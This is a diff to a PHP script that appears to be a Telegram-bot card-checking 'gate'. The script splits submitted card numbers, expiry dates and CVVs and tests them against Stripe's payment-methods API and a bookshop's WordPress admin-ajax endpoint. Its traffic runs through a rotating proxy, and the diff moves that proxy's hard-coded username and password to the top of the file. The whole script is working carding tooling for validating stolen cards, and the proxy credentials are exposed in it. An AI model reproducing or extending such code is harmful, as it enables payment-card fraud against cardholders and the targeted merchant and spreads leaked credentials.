@@ -1,5 +1,10 @@
 <?php
 
+$username = "g7305bhx467p4yl";
+$password = "ugv0ew3w009j5ii";
+$PROXYSCRAPE_PORT = 6060;
+$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
+
 if ($_SERVER['REQUEST_METHOD'] == "POST") {
     extract($_POST);
 } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
@@ -20,7 +25,7 @@ $stchk = "<b>Started Checking...</b>";
     sleep(1);
     $aray = gibarray($message);
     $cout = count($aray);
-    $total = $cout * 2;
+    $total = $cout * 1;
     if (count($aray) > 5){
   $cmsg = "𝗧𝗛𝗜𝗦 𝗚𝗔𝗧𝗘 𝗜𝗦 𝗟𝗜𝗠𝗜𝗧𝗘𝗗 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗙𝗢𝗥 𝟱 𝗖𝗖 𝗢𝗡𝗟𝗬 ⚠️";
   editMessage($chatId,$cmsg,$mes_id);
@@ -46,11 +51,6 @@ $cc = $separa[0];
 $mes = $separa[1];
 $ano = $separa[2];
 $cvv = $separa[3];
-
-$username = "g7305bhx467p4yl-country-th-city-bangkok";
-$password = "ugv0ew3w009j5ii";
-$PROXYSCRAPE_PORT = 6060;
-$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
@@ -88,11 +88,6 @@ $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 # -------------------- [2 REQ] -------------------#
-
-$username = "g7305bhx467p4yl-country-th-city-bangkok";
-$password = "ugv0ew3w009j5ii";
-$PROXYSCRAPE_PORT = 6060;
-$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://alderhousebooks.com/wp-admin/admin-ajax.php?t=1712618145893');
